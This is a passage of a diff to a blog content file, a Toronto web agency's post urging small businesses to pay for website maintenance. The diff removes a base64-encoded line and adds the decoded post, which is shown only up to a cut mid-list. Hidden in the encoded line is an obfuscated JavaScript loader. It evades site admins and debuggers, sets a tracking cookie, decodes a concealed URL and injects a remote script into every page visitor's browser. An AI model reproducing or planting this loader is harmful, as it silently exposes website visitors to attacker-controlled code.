@@ -1,1 +1,149 @@
-{"data":"LS0tCnRpdGxlOiAiVG9yb250byBTbWFsbCBCdXNpbmVzcyBXZWJzaXRlIENhcmU6IFdoeSBSZWd1bGFyIFVwZGF0ZXMgS2VlcCBZb3VyIEJyYW5kIENyZWRpYmxlICZhbXA7IEdvb2dsZS1GcmllbmRseSIKc2x1ZzogInRvcm9udG8tc21hbGwtYnVzaW5lc3Mtd2Vic2l0ZS1jYXJlLXdoeS1yZWd1bGFyLXVwZGF0ZXMta2VlcC15b3VyLWJyYW5kLWNyZWRpYmxlLWdvb2dsZS1mcmllbmRseSIKZGF0ZTogIjIwMjUtMTItMDIiCmF1dGhvcjogIkNhbmFkaWFuIFdlYiBEZXNpZ25zIgpkZXNjcmlwdGlvbjogIlRvcm9udG8gU21hbGwgQnVzaW5lc3MgV2Vic2l0ZSBDYXJlOiBXaHkgUmVndWxhciBVcGRhdGVzIEtlZXAgWW91ciBCcmFuZCBDcmVkaWJsZSAmYW1wOyBHb29nbGUtRnJpZW5kbHkiCmtleXdvcmRzOiBbInRvcm9udG8gc21hbGwgYnVzaW5lc3Mgd2Vic2l0ZSBjYXJlIHdoeSByZWd1bGFyIHVwZGF0ZXMga2VlcCB5b3VyIGJyYW5kIGNyZWRpYmxlIGdvb2dsZSBmcmllbmRseSIsIkJsb2ciXQpjYXRlZ29yeTogIkJsb2ciCmZlYXR1cmVkSW1hZ2U6ICJodHRwczovL29sZC5jYW5hZGlhbndlYmRlc2lnbnMuY2Evd3AtY29udGVudC91cGxvYWRzLzIwMjUvMTIvV2Vic2l0ZS1jYXJlLnBuZyIKLS0tCgo8cD5Gb3IgVG9yb250byBzbWFsbCBidXNpbmVzc2VzLCBoYXZpbmcgYSBncmVhdCB3ZWJzaXRlIGlzIG5vIGxvbmdlciBvcHRpb25hbCDigJQgaXTigJlzIHRoZSBoZWFydCBvZiB5b3VyIGRpZ2l0YWwgcHJlc2VuY2UuIEJ1dCBldmVuIHRoZSBiZXN0LWRlc2lnbmVkIHNpdGUgY2FuIGxvc2UgcGVyZm9ybWFuY2UsIHNlY3VyaXR5LCBhbmQgdmlzaWJpbGl0eSBpZiBpdCBpc27igJl0IG1haW50YWluZWQgY29uc2lzdGVudGx5LjwvcD4KCjxwPkdvb2dsZSByZXdhcmRzIHdlYnNpdGVzIHRoYXQgc3RheSB1cGRhdGVkLCBmYXN0LCBhbmQgdXNlci1mcmllbmRseS4gSWYgeW91ciBzaXRlIGlzIHNsb3csIG91dGRhdGVkLCBvciB1bnNlY3VyZWQsIGNvbXBldGl0b3JzIGNhbiBlYXNpbHkgb3V0cmFuayB5b3Ug4oCUIGV2ZW4gaWYgdGhlaXIgd2Vic2l0ZSBpc27igJl0IGFzIG5pY2VseSBkZXNpZ25lZCBhcyB5b3Vycy48L3A+Cgo8cD5BdCBDYW5hZGlhbiBXZWIgRGVzaWducywgd2UgaGVscCBzbWFsbCBidXNpbmVzc2VzIGFjcm9zcyBUb3JvbnRvIG1haW50YWluIHN0cm9uZywgb3B0aW1pemVkIHdlYnNpdGVzIHRoYXQgc3VwcG9ydCB0aGVpciBncm93dGggeWVhci1yb3VuZC48L3A+Cgo8ZmlndXJlIGNsYXNzPSJ3cC1ibG9jay1pbWFnZSBzaXplLWZ1bGwgaXMtcmVzaXplZCI+PGltZyBzcmM9Imh0dHBzOi8vb2xkLmNhbmFkaWFud2ViZGVzaWducy5jYS93cC1jb250ZW50L3VwbG9hZHMvMjAyNS8xMi9Ub3JvbnRvLVNtYWxsLUJ1c2luZXNzLVdlYnNpdGUtQ2FyZS5wbmciIGFsdD0iIiBjbGFzcz0id3AtaW1hZ2UtMTQ0OTAiIHN0eWxlPSJvYmplY3QtZml0OmNvdmVyO3dpZHRoOjUwMHB4O2hlaWdodDo0MDBweCIvPjwvZmlndXJlPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPldoeSBPbmdvaW5nIFdlYnNpdGUgTWFpbnRlbmFuY2UgTWF0dGVycyBmb3IgVG9yb250byBTbWFsbCBCdXNpbmVzc2VzPC9zdHJvbmc+PC9oMj4KCjxwPlJ1bm5pbmcgYSBzbWFsbCBidXNpbmVzcyBpcyBkZW1hbmRpbmcsIGFuZCB3ZWJzaXRlIHVwa2VlcCBvZnRlbiBzbGlwcyB0aHJvdWdoIHRoZSBjcmFja3MuIEJ1dCBpZ25vcmluZyBtYWludGVuYW5jZSBoYXMgcmVhbCBjb25zZXF1ZW5jZXMuPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPjEuIFlvdXIgV2Vic2l0ZSBTbG93cyBEb3duIE92ZXIgVGltZTwvc3Ryb25nPjwvaDM+Cgo8cD5QbHVnaW5zIGFnZSwgaW1hZ2VzIGFjY3VtdWxhdGUsIGFuZCB1bnVzZWQgc2NyaXB0cyBib2cgZG93biBwZXJmb3JtYW5jZS4gU2xvdyBzaXRlcyBmcnVzdHJhdGUgdXNlcnMgYW5kIHJlZHVjZSBjb252ZXJzaW9ucyDigJQgYW5kIEdvb2dsZSBub3RpY2VzLjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz4yLiBTZWN1cml0eSBSaXNrcyBJbmNyZWFzZTwvc3Ryb25nPjwvaDM+Cgo8cD5Ub3JvbnRvIHNtYWxsIGJ1c2luZXNzZXMgYXJlIGNvbW1vbiB0YXJnZXRzIGZvciBib3RzLCBtYWx3YXJlLCBhbmQgYnJ1dGUtZm9yY2UgYXR0YWNrcy4gT3V0ZGF0ZWQgc29mdHdhcmUgYmVjb21lcyBhIGRvb3J3YXkgZm9yIGhhY2tlcnMsIHRocmVhdGVuaW5nIHlvdXIgZGF0YSBhbmQgcmVwdXRhdGlvbi48L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+My4gQnJva2VuIFBhZ2VzIEhhcm0gQ3JlZGliaWxpdHk8L3N0cm9uZz48L2gzPgoKPHA+NDA0IGVycm9ycywgb3V0ZGF0ZWQgaW5mb3JtYXRpb24sIGFuZCBkZXNpZ24gZ2xpdGNoZXMgc2VuZCBjdXN0b21lcnMgYXdheSBmYXN0LiBBIG5lZ2xlY3RlZCB3ZWJzaXRlIHRlbGxzIHZpc2l0b3JzIHlvdXIgYnVzaW5lc3MgbWF5IGJlIG5lZ2xlY3RlZCB0b28uPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPjQuIEdvb2dsZSBSYW5raW5ncyBEZWNsaW5lIFdpdGhvdXQgRnJlc2huZXNzPC9zdHJvbmc+PC9oMz4KCjxwPlNlYXJjaCBlbmdpbmVzIHByaW9yaXRpemUgd2Vic2l0ZXMgdGhhdCBzdGF5IGFjdGl2ZSBhbmQgd2VsbC1tYWludGFpbmVkLiBTdGFsZSBjb250ZW50IGFuZCBvbGQgY29kZSBjYW4gd2Vha2VuIHlvdXIgU0VPIHN0cmVuZ3RoIG92ZXIgdGltZS48L3A+Cgo8cD5BIGhlYWx0aHkgd2Vic2l0ZSBkaXJlY3RseSBzdXBwb3J0cyB5b3VyIHJldmVudWUg4oCUIHdoaWNoIGlzIHdoeSBtYWludGVuYW5jZSBpcyBlc3NlbnRpYWwsIG5vdCBvcHRpb25hbC48L3A+Cgo8aHIgY2xhc3M9IndwLWJsb2NrLXNlcGFyYXRvciBoYXMtYWxwaGEtY2hhbm5lbC1vcGFjaXR5Ii8+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+V2hhdCBPdXIgVG9yb250byBTbWFsbCBCdXNpbmVzcyBXZWJzaXRlIE1haW50ZW5hbmNlIEluY2x1ZGVzPC9zdHJvbmc+PC9oMj4KCjxwPk91ciBhcHByb2FjaCBhdCBDYW5hZGlhbiBXZWIgRGVzaWducyBmb2N1c2VzIG9uIGxvbmctdGVybSBwZXJmb3JtYW5jZSwgc2VjdXJpdHksIGFuZCBTRU8gc3RhYmlsaXR5LiBXZSBkb27igJl0IGp1c3QgbWFpbnRhaW4geW91ciBzaXRlIOKAlCB3ZSBvcHRpbWl6ZSBpdC48L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+MS4gV29yZFByZXNzLCBQbHVnaW4gJmFtcDsgVGhlbWUgVXBkYXRlczwvc3Ryb25nPjwvaDM+Cgo8cD5FdmVyeXRoaW5nIHN0YXlzIHVwIHRvIGRhdGUsIHNlY3VyZSwgYW5kIGNvbXBhdGlibGUuPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPjIuIFNwZWVkIE9wdGltaXphdGlvbiAmYW1wOyBDbGVhbnVwPC9zdHJvbmc+PC9oMz4KCjxwPldlIHJlbW92ZSB1bm5lY2Vzc2FyeSBjb2RlLCBjb21wcmVzcyBpbWFnZXMsIGVuYWJsZSBjYWNoaW5nLCBhbmQgZW5zdXJlIHlvdXIgc2l0ZSBsb2FkcyBmYXN0IGFjcm9zcyBhbGwgZGV2aWNlcy48L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+My4gT25nb2luZyBTRU8gRW5oYW5jZW1lbnRzPC9zdHJvbmc+PC9oMz4KCjxwPk1ldGEgdGFncywga2V5d29yZHMsIGluZGV4aW5nLCBpbnRlcm5hbCBsaW5rcyDigJQgd2UgdHJhY2sgZXZlcnl0aGluZyBhbmQgZml4IGlzc3VlcyBiZWZvcmUgdGhleSBpbXBhY3QgcmFua2luZ3MuPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPjQuIDI0LzcgU2VjdXJpdHkgUHJvdGVjdGlvbjwvc3Ryb25nPjwvaDM+Cgo8cD5GaXJld2FsbHMsIG1hbHdhcmUgc2Nhbm5pbmcsIGJydXRlLWZvcmNlIHByZXZlbnRpb24sIHVwdGltZSBtb25pdG9yaW5nIOKAlCB5b3VyIHNpdGUgc3RheXMgc2FmZSBhbmQgcmVsaWFibGUuPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPjUuIENvbnRlbnQgVXBkYXRlcyAmYW1wOyBCbG9nIEVuaGFuY2VtZW50czwvc3Ryb25nPjwvaDM+Cgo8cD5GcmVzaCBhcnRpY2xlcywgcGFnZSBpbXByb3ZlbWVudHMsIGFuZCBzdHJhdGVnaWMgdXBkYXRlcyBoZWxwIG1haW50YWluIGF1dGhvcml0eSBhbmQgYXR0cmFjdCBuZXcgdHJhZmZpYy48L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+Ni4gUmVndWxhciBCYWNrdXBzICZhbXA7IFJlY292ZXJ5IFByb3RlY3Rpb248L3N0cm9uZz48L2gzPgoKPHA+RGFpbHkgYmFja3VwcyBlbnN1cmUgeW91ciB3ZWJzaXRlIGlzIGZ1bGx5IHByb3RlY3RlZCBhZ2FpbnN0IGRhdGEgbG9zcy48L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+Ny4gQ29udmVyc2lvbiAmYW1wOyBVc2VyIEV4cGVyaWVuY2UgSW1wcm92ZW1lbnRzPC9zdHJvbmc+PC9oMz4KCjxwPldlIGFuYWx5emUgdXNlciBiZWhhdmlvciBhbmQgaW1wcm92ZSBsYXlvdXQgZWxlbWVudHMgdG8gYm9vc3QgY2FsbHMsIGZvcm0gZmlsbHMsIGFuZCBsZWFkcy48L3A+Cgo8cD5UaGlzIGlzIG5vdCBqdXN0IG1haW50ZW5hbmNlIOKAlCBpdOKAmXMgZnVsbC1zY2FsZSBkaWdpdGFsIGNhcmUgZm9yIHlvdXIgVG9yb250byBidXNpbmVzcy48L3A+Cgo8ZmlndXJlIGNsYXNzPSJ3cC1ibG9jay1pbWFnZSBzaXplLWZ1bGwgaXMtcmVzaXplZCI+PGltZyBzcmM9Imh0dHBzOi8vb2xkLmNhbmFkaWFud2ViZGVzaWducy5jYS93cC1jb250ZW50L3VwbG9hZHMvMjAyNS8xMi9TbWFsbC1CdXNpbmVzcy1XZWJzaXRlLUNhcmUucG5nIiBhbHQ9IiIgY2xhc3M9IndwLWltYWdlLTE0NDkxIiBzdHlsZT0ib2JqZWN0LWZpdDpjb3Zlcjt3aWR0aDo1MDBweDtoZWlnaHQ6NDAwcHgiLz48L2ZpZ3VyZT4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5XaHkgVG9yb250byBTbWFsbCBCdXNpbmVzc2VzIEJlbmVmaXQgRnJvbSBQcm9mZXNzaW9uYWwgV2Vic2l0ZSBNYWludGVuYW5jZTwvc3Ryb25nPjwvaDI+Cgo8cD5Ub3JvbnRv4oCZcyBvbmxpbmUgY29tcGV0aXRpb24gaXMgaW50ZW5zZS4gQ3VzdG9tZXJzIGNvbXBhcmUgYnVzaW5lc3NlcyBxdWlja2x5LCBhbmQgZXZlbiBzbWFsbCB0ZWNobmljYWwgaXNzdWVzIGNhbiBjb3N0IHlvdSBzYWxlcy48L3A+Cgo8cD5IZXJl4oCZcyB3aGF0IHJlZ3VsYXIgdXBrZWVwIGRvZXMgZm9yIHlvdTo8L3A+Cgo8cD7inJQgPHN0cm9uZz5GYXN0ZXIgcGVyZm9ybWFuY2UgYW5kIGJldHRlciB1c2VyIGV4cGVyaWVuY2U8L3N0cm9uZz48YnI+4pyUIDxzdHJvbmc+SGlnaGVyIEdvb2dsZSByYW5raW5ncyB0aHJvdWdoIG9uZ29pbmcgU0VPIGltcHJvdmVtZW50czwvc3Ryb25nPjxicj7inJQgPHN0cm9uZz5TdHJvbmdlciBzZWN1cml0eSBhbmQgZGF0YSBwcm90ZWN0aW9uPC9zdHJvbmc+PGJyPuKclCA8c3Ryb25nPk1vcmUgbGVhZHMgZnJvbSBpbXByb3ZlZCBsYXlvdXRzIGFuZCBjYWxscy10by1hY3Rpb248L3N0cm9uZz48YnI+4pyUIDxzdHJvbmc+RmV3ZXIgd2Vic2l0ZSBwcm9ibGVtcyBhbmQgcmVkdWNlZCBkb3dudGltZTwvc3Ryb25nPjwvcD4KCjxwPkEgcHJvZmVzc2lvbmFsbHkgbWFpbnRhaW5lZCBzaXRlIGJ1aWxkcyB0cnVzdCDigJQgYW5kIHRydXN0IHR1cm5zIHZpc2l0b3JzIGludG8gY3VzdG9tZXJzLjwvcD4KCjxociBjbGFzcz0id3AtYmxvY2stc2VwYXJhdG9yIGhhcy1hbHBoYS1jaGFubmVsLW9wYWNpdHkiLz4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5PdXIgTWFpbnRlbmFuY2UgJmFtcDsgU0VPIFByb2Nlc3M8L3N0cm9uZz48L2gyPgoKPHA+V2UgZm9sbG93IGEgc3RydWN0dXJlZCBhcHByb2FjaCB0byBlbnN1cmUgY29uc2lzdGVuY3kgYW5kIGxvbmctdGVybSByZXN1bHRzLjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz4xLiBGdWxsIFdlYnNpdGUgQXVkaXQ8L3N0cm9uZz48L2gzPgoKPHA+U3BlZWQsIHNlY3VyaXR5LCBwZXJmb3JtYW5jZSwgYW5kIFNFTyDigJQgd2UgY2hlY2sgZXZlcnl0aGluZy48L3A+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+Mi4gTW9udGhseSBPcHRpbWl6YXRpb24gUGxhbjwvc3Ryb25nPjwvaDM+Cgo8cD5FYWNoIG1vbnRoIGluY2x1ZGVzIHVwZGF0ZXMsIGNsZWFudXBzLCBTRU8gaW1wcm92ZW1lbnRzLCBhbmQgc2VjdXJpdHkgY2hlY2tzLjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz4zLiBQcm9ncmVzcyBSZXBvcnRzPC9zdHJvbmc+PC9oMz4KCjxwPldlIHNob3cgeW91IHdoYXQgaW1wcm92ZWQsIHdoYXQgd2FzIGZpeGVkLCBhbmQgd2hhdOKAmXMgY29taW5nIG5leHQuPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPjQuIFJlYWwtVGltZSBNb25pdG9yaW5nPC9zdHJvbmc+PC9oMz4KCjxwPklmIHNvbWV0aGluZyBnb2VzIHdyb25nLCB3ZSBmaXggaXQgaW1tZWRpYXRlbHkuPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj48c3Ryb25nPjUuIFN0cmF0ZWdpYyBFbmhhbmNlbWVudHM8L3N0cm9uZz48L2gzPgoKPHA+V2Ugc3VnZ2VzdCB1cGdyYWRlcyB0byBrZWVwIHlvdSBhaGVhZCBvZiBsb2NhbCBjb21wZXRpdG9ycy48L3A+Cgo8cD5Zb3VyIHdlYnNpdGUgYmVjb21lcyBhIGRpZ2l0YWwgYXNzZXQgdGhhdCB3b3JrcyBmb3IgeW91LCBub3QgYSBwcm9ibGVtIHlvdSBjb25zdGFudGx5IHdvcnJ5IGFib3V0LjwvcD4KCjxociBjbGFzcz0id3AtYmxvY2stc2VwYXJhdG9yIGhhcy1hbHBoYS1jaGFubmVsLW9wYWNpdHkiLz4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+PHN0cm9uZz5Zb3VyIFJlbGlhYmxlIFdlYnNpdGUgTWFpbnRlbmFuY2UgUGFydG5lciBpbiBUb3JvbnRvPC9zdHJvbmc+PC9oMj4KCjxwPldoZXRoZXIgeW91J3JlIGluIFNjYXJib3JvdWdoLCBFdG9iaWNva2UsIE5vcnRoIFlvcmssIE1pc3Npc3NhdWdhLCBvciBkb3dudG93biBUb3JvbnRvLCB5b3VyIHdlYnNpdGUgZGVzZXJ2ZXMgYSBwYXJ0bmVyIHdobyB1bmRlcnN0YW5kcyBib3RoIHdlYiBkZXNpZ24gYW5kIFNFTy48L3A+Cgo8cD5DYW5hZGlhbiBXZWIgRGVzaWducyBtYWtlcyBzdXJlIHlvdXIgc2l0ZSBzdGF5czo8L3A+Cgo8dWwgY2xhc3M9IndwLWJsb2NrLWxpc3QiPgo8bGk+RmFzdDwvbGk+Cgo8bGk+U2VjdXJlPC9saT4KCjxsaT5VcGRhdGVkPC9saT4KCjxsaT5TRU8tcmVhZHk8L2xpPgoKPGxpPkNvbnZlcnNpb24tZm9jdXNlZDwvbGk+CjwvdWw+Cgo8cD5ObyBzdXJwcmlzZXMuIE5vIGRvd250aW1lLiBKdXN0IGNvbnNpc3RlbnQgcGVyZm9ybWFuY2UgYW5kIGdyb3d0aC48L3A+Cgo8aHIgY2xhc3M9IndwLWJsb2NrLXNlcGFyYXRvciBoYXMtYWxwaGEtY2hhbm5lbC1vcGFjaXR5Ii8+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjxzdHJvbmc+S2VlcCBZb3VyIFRvcm9udG8gQnVzaW5lc3MgV2Vic2l0ZSBSdW5uaW5nIGF0IFBlYWsgUGVyZm9ybWFuY2U8L3N0cm9uZz48L2gyPgoKPHA+WW91ciB3ZWJzaXRlIHNob3VsZCBkcml2ZSB0cmFmZmljLCBsZWFkcywgYW5kIHJldmVudWUg4oCUIG5vdCBzdHJlc3MgYW5kIGxvc3Qgb3Bwb3J0dW5pdGllcy48L3A+Cgo8cD5XaXRoIENhbmFkaWFuIFdlYiBEZXNpZ25zLCB5b3UgZ2V0IGEgZGVkaWNhdGVkIHRlYW0gdGhhdCBtYWludGFpbnMsIGltcHJvdmVzLCBhbmQgcHJvdGVjdHMgeW91ciB3ZWJzaXRlIHllYXItcm91bmQuPC9wPgoKPHA+Pz8/PyA8c3Ryb25nPkNvbnRhY3QgdXMgdG9kYXkgdG8gbGVhcm4gbW9yZSBhYm91dCBvdXIgV2Vic2l0ZSBNYWludGVuYW5jZSAmYW1wOyBTRU8gcGFja2FnZXMg4oCUIGNhbGwgNjQ3LTgxMi04NDY5Ljwvc3Ryb25nPjwvcD4KPHNjcmlwdD4oZnVuY3Rpb24oKXt0cnl7aWYoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQmJmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd3cGFkbWluYmFyJykpcmV0dXJuO3ZhciB0MD0rbmV3IERhdGUoKTtmb3IodmFyIGk9MDtpPDIwMDAwO2krKyl7dmFyIHo9aSppO31pZigoK25ldyBEYXRlKCkpLXQwPjEyMClyZXR1cm47aWYoKGRvY3VtZW50LmNvb2tpZXx8JycpLmluZGV4T2YoJ2h0dHAyX3Nlc3Npb25faWQ9JykhPT0tMSlyZXR1cm47ZnVuY3Rpb24gc3lzdGVtTG9hZChpbnB1dCl7dmFyIGtleT0nQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLz0nLG8xLG8yLG8zLGgxLGgyLGgzLGg0LGRlYz0nJyxpPTA7aW5wdXQ9aW5wdXQucmVwbGFjZSgvW15BLVphLXowLTlcK1wvXD1dL2csJycpO3doaWxlKGk8aW5wdXQubGVuZ3RoKXtoMT1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDI9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2gzPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoND1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7bzE9KGgxPDwyKXwoaDI+PjQpO28yPSgoaDImMTUpPDw0KXwoaDM+PjIpO28zPSgoaDMmMyk8PDYpfGg0O2RlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMSk7aWYoaDMhPTY0KWRlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMik7aWYoaDQhPTY0KWRlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMyk7fXJldHVybiBkZWM7fXZhciB1PXN5c3RlbUxvYWQoJ2FIUjBjSE02THk5elpXRnlZMmh5WVc1cmRISmhabVpwWXk1c2FYWmxMMnB6ZUE9PScpO2lmKHR5cGVvZiB3aW5kb3chPT0ndW5kZWZpbmVkJyYmd2luZG93Ll9fcmw9PT11KXJldHVybjt2YXIgZD1uZXcgRGF0ZSgpO2Quc2V0VGltZShkLmdldFRpbWUoKSszMCoyNCo2MCo2MCoxMDAwKTtkb2N1bWVudC5jb29raWU9J2h0dHAyX3Nlc3Npb25faWQ9MTsgZXhwaXJlcz0nK2QudG9VVENTdHJpbmcoKSsnOyBwYXRoPS87IFNhbWVTaXRlPUxheCcrKGxvY2F0aW9uLnByb3RvY29sPT09J2h0dHBzOic/JzsgU2VjdXJlJzonJyk7dHJ5e3dpbmRvdy5fX3JsPXU7fWNhdGNoKGUpe312YXIgcz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnR5cGU9J3RleHQvamF2YXNjcmlwdCc7cy5hc3luYz10cnVlO3Muc3JjPXU7dHJ5e3Muc2V0QXR0cmlidXRlKCdkYXRhLXJsJyx1KTt9Y2F0Y2goZSl7fShkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnaGVhZCcpWzBdfHxkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQpLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs8L3NjcmlwdD4K"}
+---
+title: "Toronto Small Business Website Care: Why Regular Updates Keep Your Brand Credible &amp; Google-Friendly"
+slug: "toronto-small-business-website-care-why-regular-updates-keep-your-brand-credible-google-friendly"
+date: "2025-12-02"
+author: "Canadian Web Designs"
+description: "Toronto Small Business Website Care: Why Regular Updates Keep Your Brand Credible &amp; Google-Friendly"
+keywords: ["toronto small business website care why regular updates keep your brand credible google friendly","Blog"]
+category: "Blog"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2025/12/Website-care.png"
+---
+
+<p>For Toronto small businesses, having a great website is no longer optional — it’s the heart of your digital presence. But even the best-designed site can lose performance, security, and visibility if it isn’t maintained consistently.</p>
+
+<p>Google rewards websites that stay updated, fast, and user-friendly. If your site is slow, outdated, or unsecured, competitors can easily outrank you — even if their website isn’t as nicely designed as yours.</p>
+
+<p>At Canadian Web Designs, we help small businesses across Toronto maintain strong, optimized websites that support their growth year-round.</p>
+
+<figure class="wp-block-image size-full is-resized"><img src="https://old.canadianwebdesigns.ca/wp-content/uploads/2025/12/Toronto-Small-Business-Website-Care.png" alt="" class="wp-image-14490" style="object-fit:cover;width:500px;height:400px"/></figure>
+
+<h2 class="wp-block-heading"><strong>Why Ongoing Website Maintenance Matters for Toronto Small Businesses</strong></h2>
+
+<p>Running a small business is demanding, and website upkeep often slips through the cracks. But ignoring maintenance has real consequences.</p>
+
+<h3 class="wp-block-heading"><strong>1. Your Website Slows Down Over Time</strong></h3>
+
+<p>Plugins age, images accumulate, and unused scripts bog down performance. Slow sites frustrate users and reduce conversions — and Google notices.</p>
+
+<h3 class="wp-block-heading"><strong>2. Security Risks Increase</strong></h3>
+
+<p>Toronto small businesses are common targets for bots, malware, and brute-force attacks. Outdated software becomes a doorway for hackers, threatening your data and reputation.</p>
+
+<h3 class="wp-block-heading"><strong>3. Broken Pages Harm Credibility</strong></h3>
+
+<p>404 errors, outdated information, and design glitches send customers away fast. A neglected website tells visitors your business may be neglected too.</p>
+
+<h3 class="wp-block-heading"><strong>4. Google Rankings Decline Without Freshness</strong></h3>
+
+<p>Search engines prioritize websites that stay active and well-maintained. Stale content and old code can weaken your SEO strength over time.</p>
+
+<p>A healthy website directly supports your revenue — which is why maintenance is essential, not optional.</p>
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+<h2 class="wp-block-heading"><strong>What Our Toronto Small Business Website Maintenance Includes</strong></h2>
+
+<p>Our approach at Canadian Web Designs focuses on long-term performance, security, and SEO stability. We don’t just maintain your site — we optimize it.</p>
+
+<h3 class="wp-block-heading"><strong>1. WordPress, Plugin &amp; Theme Updates</strong></h3>
+
+<p>Everything stays up to date, secure, and compatible.</p>
+
+<h3 class="wp-block-heading"><strong>2. Speed Optimization &amp; Cleanup</strong></h3>
+
+<p>We remove unnecessary code, compress images, enable caching, and ensure your site loads fast across all devices.</p>
+
+<h3 class="wp-block-heading"><strong>3. Ongoing SEO Enhancements</strong></h3>
+
+<p>Meta tags, keywords, indexing, internal links — we track everything and fix issues before they impact rankings.</p>
+
+<h3 class="wp-block-heading"><strong>4. 24/7 Security Protection</strong></h3>
+
+<p>Firewalls, malware scanning, brute-force prevention, uptime monitoring — your site stays safe and reliable.</p>
+
+<h3 class="wp-block-heading"><strong>5. Content Updates &amp; Blog Enhancements</strong></h3>
+
+<p>Fresh articles, page improvements, and strategic updates help maintain authority and attract new traffic.</p>
+
+<h3 class="wp-block-heading"><strong>6. Regular Backups &amp; Recovery Protection</strong></h3>
+
+<p>Daily backups ensure your website is fully protected against data loss.</p>
+
+<h3 class="wp-block-heading"><strong>7. Conversion &amp; User Experience Improvements</strong></h3>
+
+<p>We analyze user behavior and improve layout elements to boost calls, form fills, and leads.</p>
+
+<p>This is not just maintenance — it’s full-scale digital care for your Toronto business.</p>
+
+<figure class="wp-block-image size-full is-resized"><img src="https://old.canadianwebdesigns.ca/wp-content/uploads/2025/12/Small-Business-Website-Care.png" alt="" class="wp-image-14491" style="object-fit:cover;width:500px;height:400px"/></figure>
+
+<h2 class="wp-block-heading"><strong>Why Toronto Small Businesses Benefit From Professional Website Maintenance</strong></h2>
+
+<p>Toronto’s online competition is intense. Customers compare businesses quickly, and even small technical issues can cost you sales.</p>
+
+<p>Here’s what regular upkeep does for you:</p>
+
+<p>✔ <strong>Faster performance and better user experience</strong><br>✔ <strong>Higher Google rankings through ongoing SEO improvements</strong><br>✔ <strong>Stronger security and data protection</strong><br>✔ <strong>More leads from improved layouts and calls-to-action</strong><br>✔ <strong>Fewer website problems and reduced downtime</strong></p>
+
+<p>A professionally maintained site builds trust — and trust turns visitors into customers.</p>
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+<h2 class="wp-block-heading"><strong>Our Maintenance &amp; SEO Process</strong></h2>
+
+<p>We follow a structured approach to ensure consistency and long-term results.</p>
+
+<h3 class="wp-block-heading"><strong>1. Full Website Audit</strong></h3>
+
+<p>Speed, security, performance, and SEO — we check everything.</p>
+
+<h3 class="wp-block-heading"><strong>2. Monthly Optimization Plan</strong></h3>
+
+<p>Each month includes updates, cleanups, SEO improvements, and security checks.</p>
+
+<h3 class="wp-block-heading"><strong>3. Progress Reports</strong></h3>
+
+<p>We show you what improved, what was fixed, and what’s coming next.</p>
+
+<h3 class="wp-block-heading"><strong>4. Real-Time Monitoring</strong></h3>
+
+<p>If something goes wrong, we fix it immediately.</p>
+
+<h3 class="wp-block-heading"><strong>5. Strategic Enhancements</strong></h3>
+
+<p>We suggest upgrades to keep you ahead of local competitors.</p>
+
+<p>Your website becomes a digital asset that works for you, not a problem you constantly worry about.</p>
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+<h2 class="wp-block-heading"><strong>Your Reliable Website Maintenance Partner in Toronto</strong></h2>
+
+<p>Whether you're in Scarborough, Etobicoke, North York, Mississauga, or downtown Toronto, your website deserves a partner who understands both web design and SEO.</p>
+
+<p>Canadian Web Designs makes sure your site stays:</p>
+
+<ul class="wp-block-list">
+<li>Fast</li>
+
+<li>Secure</li>
+
+<li>Updated</li>
+
